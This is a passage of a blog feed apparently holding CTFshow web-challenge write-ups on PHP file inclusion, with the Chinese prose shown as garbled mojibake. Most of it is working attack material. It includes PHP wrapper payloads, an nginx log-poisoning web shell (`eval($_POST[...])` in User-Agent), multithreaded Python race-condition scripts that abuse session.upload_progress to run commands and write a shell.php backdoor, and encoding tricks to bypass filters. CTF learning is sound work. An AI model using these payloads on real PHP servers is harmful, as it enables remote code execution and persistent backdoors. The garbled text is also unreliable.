class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'verysafe.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ctf"</span><span class="token punctuation">:</span> <span class="token string">"/tmp/sess_down"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'aaaaaa'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'retry'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>[PHPÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºàÂà©Áî®phpinfoÔºâ](<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub&#x2F;php&#x2F;inclusion&#x2F;README.zh-cn.md at master ¬∑ vulhub&#x2F;vulhub (github.com)</a>)</p><p>ËøôÁØáËØ¶ÁªÜËÆ≤Ëß£‰∫ÜÊºèÊ¥ûÁöÑÂà©Áî®Ôºå‰πãÂâçÁöÑÊù°‰ª∂Á´û‰∫âÂ∞±ÊòØËøôÊ†∑</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> phpÁâπÊÄß </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-include</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-include/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-include/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><p>‰∏ªË¶ÅËÄÉÂØüÊòØphp‰º™ÂçèËÆÆÔºå‰πãÂâçRceÈáå‰πüÊúâÊèêËøáÔºåËøôÈáåÊîæÂá†‰∏™Â∏∏Áî®Payload</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p></blockquote><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ÁºñÁ†ÅÂêéÁöÑÊï∞ÊçÆ)</p></blockquote><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php  </p></blockquote><blockquote><p>php:&#x2F;&#x2F;input<br>POST cmd</p></blockquote><h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>Á≠æÂà∞</p><p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>Â∞ÜphpËøáÊª§ÔºåÂèØ‰ª•ËÄÉËôëdata</p><p>Payload:</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></blockquote><h4 id="web80-nginxÊó•ÂøóÊ≥®ÂÖ•"><a href="#web80-nginxÊó•ÂøóÊ≥®ÂÖ•" class="headerlink" title="web80(nginxÊó•ÂøóÊ≥®ÂÖ•)"></a>web80(nginxÊó•ÂøóÊ≥®ÂÖ•)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>data‰πüË¢´ban‰∫Ü</p><p>‰ΩøÁî®nginxÊó•ÂøóÊñá‰ª∂ÂåÖÂê´ÔºåÂú®User-AgentÂÜôÂÖ•‰∏ÄÂè•ËØùÊú®È©¨Ôºå‰ΩøÁî®ËöÅÂâëËøûÊé•<a href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p><p>Payload:</p><blockquote><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>User-Agent: <?php @eval($_POST['attack']);?></p></blockquote><p>ÁúãÈ¢òËß£‰πüÂèØ‰ª•Â§ßÂ∞èÂÜôÁªïËøáÁî®PHP:&#x2F;&#x2F;input</p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>Â§öËøáÊª§‰∫ÜÂÜíÂè∑ÔºåÊâÄ‰ª•‰æùÊóßÂèØ‰ª•nginxÊó•ÂøóÊ≥®ÂÖ•</p><h4 id="web82-Âà©Áî®session-upload-progressËøõË°åÊñá‰ª∂ÂåÖÂê´"><a href="#web82-Âà©Áî®session-upload-progressËøõË°åÊñá‰ª∂ÂåÖÂê´" class="headerlink" title="web82(Âà©Áî®session.upload_progressËøõË°åÊñá‰ª∂ÂåÖÂê´)"></a>web82(Âà©Áî®session.upload_progressËøõË°åÊñá‰ª∂ÂåÖÂê´)</h4><p><a href="https://www.freebuf.com/vuls/202819.html">Âà©Áî®session.upload_progressËøõË°åÊñá‰ª∂ÂåÖÂê´ÂíåÂèçÂ∫èÂàóÂåñÊ∏óÈÄè</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Â¶ÇÊûúsession.auto_start&#x3D;On ÔºåÂàôPHPÂú®Êé•Êî∂ËØ∑Ê±ÇÁöÑÊó∂ÂÄô‰ºöËá™Âä®ÂàùÂßãÂåñSessionÔºå‰∏çÂÜçÈúÄË¶ÅÊâßË°åsession_start()„ÄÇ‰ΩÜÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåËøô‰∏™ÈÄâÈ°πÈÉΩÊòØÂÖ≥Èó≠ÁöÑ„ÄÇ‰ΩÜsessionËøòÊúâ‰∏Ä‰∏™ÈªòËÆ§ÈÄâÈ°πÔºåsession.use_strict_modeÈªòËÆ§ÂÄº‰∏∫0„ÄÇÊ≠§Êó∂Áî®Êà∑ÊòØÂèØ‰ª•Ëá™Â∑±ÂÆö‰πâSession IDÁöÑ„ÄÇÊØîÂ¶ÇÔºåÊàë‰ª¨Âú®CookieÈáåËÆæÁΩÆPHPSESSID&#x3D;TGAOÔºåPHPÂ∞Ü‰ºöÂú®ÊúçÂä°Âô®‰∏äÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂Ôºö&#x2F;tmp&#x2F;sess_TGAO‚Äù„ÄÇÂç≥‰ΩøÊ≠§Êó∂Áî®Êà∑Ê≤°ÊúâÂàùÂßãÂåñSessionÔºåPHP‰πü‰ºöËá™Âä®ÂàùÂßãÂåñSession„ÄÇ Âπ∂‰∫ßÁîü‰∏Ä‰∏™ÈîÆÂÄºÔºåËøô‰∏™ÈîÆÂÄºÊúâini.get(‚Äúsession.upload_progress.prefix‚Äù)+Áî±Êàë‰ª¨ÊûÑÈÄ†ÁöÑsession.upload_progress.nameÂÄºÁªÑÊàêÔºåÊúÄÂêéË¢´ÂÜôÂÖ•sess_Êñá‰ª∂Èáå„ÄÇ</p><p>‰ΩÜÊòØÈóÆÈ¢òÊù•‰∫ÜÔºåÈªòËÆ§ÈÖçÁΩÆsession.upload_progress.cleanup &#x3D; onÂØºËá¥Êñá‰ª∂‰∏ä‰º†ÂêéÔºåsessionÊñá‰ª∂ÂÜÖÂÆπÁ´ãÂç≥Ê∏ÖÁ©∫Ôºå</p><p>Ê≠§Êó∂Êàë‰ª¨ÂèØ‰ª•Âà©Áî®Á´û‰∫âÔºåÂú®sessionÊñá‰ª∂ÂÜÖÂÆπÊ∏ÖÁ©∫ÂâçËøõË°åÂåÖÂê´Âà©Áî®„ÄÇ</p><p><strong>sessionÊñá‰ª∂ÈªòËÆ§Â≠òÂÇ®Ë∑ØÂæÑ</strong></p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p><strong>ÊñπÊ≥ï‰∏Ä:</strong></p><p>ÂÖà‰ª•POSTÁöÑÂΩ¢ÂºèÂèëÂåÖÔºå‰∏ä‰º†ÁöÑÊñá‰ª∂ÈöèÊÑè,‰∏ãÈù¢ÊòØÊûÑÈÄ†ÁöÑ‰∏ä‰º†Ë°®Âçï</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>‰ΩøÁî®burpËøõË°åÁàÜÁ†¥Ôºà‰∏§‰∏™Ë¶ÅÂêåÊó∂ÁàÜÁ†¥Ôºâ</p><p><img src="web82.png" loading="lazy"></p><p><img src="web82_2.png" loading="lazy"></p><p>ÊúÄÂêéÁ´û‰∫âÂæóÂà∞flag</p><p><strong>ÊñπÊ≥ï‰∫å</strong>:</p><p>ÂèØ‰ª•Âà©Áî®ËÑöÊú¨ËøõË°åÊù°‰ª∂Á´û‰∫â</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'Qftm'</span>url <span class="token operator">=</span> <span class="token string">'https://2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></code></pre><h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>Êù°‰ª∂Á´û‰∫âÂêå‰∏ä</p><h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>Ê∑ªÂä†‰∫ÜÂ¶Ç‰∏ã‰ª£Á†Å</p><p>system(‚Äúrm -rf &#x2F;tmp&#x2F;*‚Äù);</p><p>&#x2F;&#x2F; Âú® rm -rf &#x2F;tmp&#x2F;* ÊâßË°å‰πãÂêéÁ´ãÂàªÊúâÊñ∞ÁöÑËØ∑Ê±ÇÂàõÂª∫‰∫Ü sess_shell Êñá‰ª∂ Êù°‰ª∂Á´û‰∫â‰æùÁÑ∂ÊúâÊïà</p><h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>Ê∑ªÂä†‰∫Ü‰∏Ä‰∏™ÂÜÖÂÆπËØÜÂà´ÔºåÂ¶ÇÊûúÊúâ<code>&lt;</code>Â∞±dieÔºå‰æùÊóßÂèØ‰ª•Á´û‰∫â„ÄÇ</p><h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)Ë°®Á§∫ÂΩìÂâçÊñá‰ª∂ÁöÑÁªùÂØπË∑ØÂæÑ„ÄÇset_include_pathÂáΩÊï∞,ÊòØÁî®Êù•ËÆæÁΩÆincludeÁöÑË∑ØÂæÑÁöÑÔºåÂ∞±ÊòØinclude()ÂèØ‰ª•‰∏çÊèê‰æõÊñá‰ª∂ÁöÑÂÆåÊï¥Ë∑ØÂæÑ‰∫Ü„ÄÇ<br>includeÊñá‰ª∂Êó∂,ÂΩìÂåÖÂê´Ë∑ØÂæÑÊó¢‰∏çÊòØÁõ∏ÂØπË∑ØÂæÑÔºå‰πü‰∏çÊòØÁªùÂØπË∑ØÂæÑÊó∂(Â¶Ç:include(‚Äútest.php‚Äù))Ôºå‰ºöÂÖàÊü•Êâæinclude_pathÊâÄËÆæÁΩÆÁöÑÁõÆÂΩï„ÄÇ<br>ËÑöÊú¨ÈáåÁî®ÁöÑÊòØÂÆåÊï¥Ë∑ØÂæÑÔºå‰∏çÂΩ±ÂìçÁ´û‰∫â„ÄÇ</p><h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET['file']))&#123;    $file = $_GET['file'];    $content = $_POST['content'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);    file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Â§ß‰Ω¨Âà´ÁßÄ‰∫Ü'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content);&#125;</code></pre><p>file_put_contents() ÂáΩÊï∞Êää‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂÜôÂÖ•Êñá‰ª∂‰∏≠„ÄÇ</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">PHP file_put_contents() ÂáΩÊï∞</a></p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ447wWhSwi2iD&alichlgref=https://xz.aliyun.com/t/8163#toc-3">file_put_contentÂíåÊ≠ª‰∫°¬∑ÊùÇÁ≥Ö‰ª£Á†Å‰πãÁºò</a></p><p>ÂèÇËÄÉÂ§ß‰Ω¨ÊñáÁ´†ÔºåÂèØ‰ª•‰ΩøÁî®base64ÊàñËÄÖrot13Êù•ËøõË°åÂØπÂâçÈù¢‰ª£Á†ÅËøõË°åÊùÇÁ≥Ö</p><p>È¶ñÂÖàÊûÑÈÄ†$fileÔºåÂõ†‰∏∫Ë¶ÅÂØπfileËøõË°å‰∏ÄÊ¨°urlËß£Á†ÅÊâÄ‰ª•Êàë‰ª¨ÂØπpayloadËøõË°å‰∏§Ê¨°urlÁºñÁ†Å</p><p>Êôö‰∏äÂ§ßÂ§öÂ∑•ÂÖ∑ÊòØÂØπËã±ÊñáÂ≠óÁ¨¶‰∏çËøõË°åurlÁºñÁ†ÅÁöÑÔºåÊâÄ‰ª•ËøôÈáåÁªôÂá∫ËÑöÊú¨Êñπ‰æøËøõË°åurlencode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">def</span> <span class="token function">encode_char</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># ÊåáÂÆöÂ≠óÁ¨¶ÈõÜÔºåËΩ¨Êç¢‰∏∫ASCIIÁ†ÅÂêéÔºåÂÜçËΩ¨Êç¢‰∏∫16ËøõÂà∂ÔºåÂπ∂Ê∑ªÂä†%</span>    special_chars <span class="token operator">=</span> <span class="token string">"!#$&amp;'()*+,/:;=?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>    <span class="token keyword">if</span> char <span class="token keyword">in</span> special_chars<span class="token punctuation">:</span>        <span class="token comment"># ËΩ¨Êç¢‰∏∫ASCIIÁ†ÅÔºåÁÑ∂ÂêéËΩ¨Êç¢‰∏∫16ËøõÂà∂ÔºåÂπ∂Ê∑ªÂä†%</span>        <span class="token keyword">return</span> <span class="token string">'%&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># ÂØπÂÖ∂‰ªñÂ≠óÁ¨¶ËøõË°åURLÁºñÁ†Å</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># ÂØπÂ≠óÁ¨¶‰∏≤‰∏≠ÁöÑÊØè‰∏™Â≠óÁ¨¶ËøõË°åÁºñÁ†Å</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>encode_char<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> input_string<span class="token punctuation">)</span>input_string <span class="token operator">=</span> <span class="token string">"Test"</span>encoded_string <span class="token operator">=</span> url_encode<span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded_string<span class="token punctuation">)</span></code></pre><blockquote><p>php:&#x2F;&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;hsad.php</p><p>‰∏§Ê¨°ÁºñÁ†ÅÂêéÂæóÂà∞</p><p>file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%38%25%37%33%25%36%31%25%36%34%25%32%65%25%37%30%25%36%38%25%37%30</p></blockquote><p>ÁÑ∂ÂêéËøõË°åPost content</p><p>base64ÂèØ‰ª•ÁªïËøádieÂáΩÊï∞„ÄÇÂõ†‰∏∫base64ÁºñÁ†ÅËåÉÂõ¥ÊòØ <code>0 ÔΩû 9,a ÔΩû z,A ÔΩû Z,+,/ Ôºå</code>ÊâÄ‰ª•Èô§‰∫ÜËøô‰∫õÂ≠óÁ¨¶ÔºåÂÖ∂‰ªñÂ≠óÁ¨¶ÈÉΩ‰ºöË¢´ÂøΩÁï•Êéâ„ÄÇ</p><p>base64ËøáÊª§‰πãÂêéÂ∞±Âè™Êúâ(phpdie)6‰∏™Â≠óÁ¨¶‰∫ÜÔºåbase64Ë¶ÅÊ±ÇÊääÊØè‰∏â‰∏™8BitÁöÑÂ≠óËäÇËΩ¨Êç¢‰∏∫Âõõ‰∏™6BitÁöÑÂ≠óËäÇÔºåÊâÄ‰ª•ËøôÈáå‰πüË¶ÅÂáëÂ§üÂõõ‰∏™Â≠óËäÇÁöÑÂÄçÊï∞ÔºåÈÅøÂÖçbase64Ëß£Á†ÅÂá∫ÈóÆÈ¢òÔºåËøôÈáåÂä†‰∏ä‰∏§‰∏™Â≠óÁ¨¶Âç≥ÂèØ„ÄÇ</p><blockquote><p>‚Äã                    <?php system("tac fl0g.php");?></p><p>content&#x3D;aaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p></blockquote><h4 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h4><p>ÂèëÁé∞ËøáÊª§ÁöÑËøòÊòØÊØîËæÉÂ§öÔºå‰ΩÜÊòØÊ≤°ÊúâËøáÊª§ : ÈÇ£Êàë‰ª¨Â∞±ÂèØ‰ª•‰ΩøÁî®PHP‰º™ÂçèËÆÆÂ∞±ÊòØ ËøôÈáå‰ΩøÁî®ÁöÑÊòØ data:&#x2F;&#x2F;text&#x2F;plain;base64,poc ÂÖ∂ÂÆûÂíå79Â∑Æ‰∏çÂ§ö Âè™ÊòØÊ≥®ÊÑèÁöÑÊòØÁºñÁ†ÅÊàêbase64ÁöÑÊó∂ÂÄôË¶ÅÂéªÊéâ Ôºù</p><h4 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h4><p>ËÆøÈóÆÁΩëÈ°µÁªô‰∫ÜËßÜÈ¢ëÔºåformostÂàÜËß£Âá∫Êù•ÊúâÂõæÁâáÊòØÁΩëÁ´ôÊ∫êÁ†Å</p><p><img src="web116.png" loading="lazy"></p><p>ÁÑ∂ÂêéÁõ¥Êé•ËÆøÈóÆflag.phpÂ∞±Ë°åÔºåËØ¥ÂÆûËØùÊúâÁÇπÊáµÔºåÂõ†‰∏∫ËøáÊª§Êå∫Áã†ÁöÑ</p><h4 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h4><p>ÂèÇËÄÉÊñáÁ´†Ôºö</p><p><a 